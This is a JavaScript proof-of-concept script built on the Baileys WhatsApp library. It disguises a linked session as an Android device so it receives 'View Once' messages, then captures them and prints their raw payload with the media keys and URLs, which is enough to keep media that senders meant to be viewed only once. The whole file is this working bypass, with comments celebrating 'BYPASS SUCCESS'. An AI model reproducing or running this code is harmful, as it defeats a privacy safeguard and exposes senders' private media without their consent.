import makeWASocket, { useMultiFileAuthState, DisconnectReason } from '@whiskeysockets/baileys'
import pino from 'pino'

async function startSpoofedSession() {
    // 1. Setup the authentication state storage
    // It will create this folder to store the keys. Delete it if you need to re-pair.
    const { state, saveCreds } = await useMultiFileAuthState('./auth_info_android_bypass')

    // 2. Initialize the socket
    const sock = makeWASocket.default({
        auth: state,
        printQRInTerminal: true,
        // Using pino for minimal, clean logging output. Set to 'debug' to see raw WS frames.
        logger: pino({ level: 'silent' }), 
        
        // THE BYPASS: Masquerade as a mobile companion device
        browser: ['Android', 'WhatsApp', '2.26.16.73'],
        
        syncFullHistory: false // We don't need gigabytes of chat history for a PoC
    })

    // 3. Handle auth state updates (crucial for keeping the session alive after pairing)
    sock.ev.on('creds.update', saveCreds)

    // 4. Handle connection updates (QR code generation, disconnects, etc.)
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update
        
        if (connection === 'close') {
            const shouldReconnect = lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut
            console.log(`Connection closed due to error. Reconnecting: ${shouldReconnect}`)
            if (shouldReconnect) startSpoofedSession()
        } else if (connection === 'open') {
            console.log('✅ Connected successfully! The server now thinks you are an Android device.')
            console.log('Waiting for View Once messages...')
        }
    })

    // 5. Intercept and print messages
    sock.ev.on('messages.upsert', async ({ messages, type }) => {
        if (type !== 'notify') return // Only care about new messages, not history syncs

        const msg = messages[0]
        if (!msg.message) return 

        const sender = msg.key.remoteJid

        // Check if it's a View Once message. Baileys wraps it in viewOnceMessageV2 or viewOnceMessage
        const isViewOnce = msg.message?.viewOnceMessageV2 || msg.message?.viewOnceMessage
        
        if (isViewOnce) {
            console.log('\n🚨 [BYPASS SUCCESS] Intercepted View Once Message!')
            console.log(`From: ${sender}`)
            console.log('Raw Encrypted Payload:')
            // This dumps the JSON containing the mediaKey, URL, and SHA256 hashes
            console.log(JSON.stringify(isViewOnce, null, 2))
            console.log('--------------------------------------------------\n')
        } else {
            // Optional: Print normal messages just so you know the socket is alive
            const text = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '[Non-text media]'
            console.log(`[Normal] ${sender.split('@')[0]}: ${text}`)
        }
    })
}

// Fire it up
startSpoofedSession()
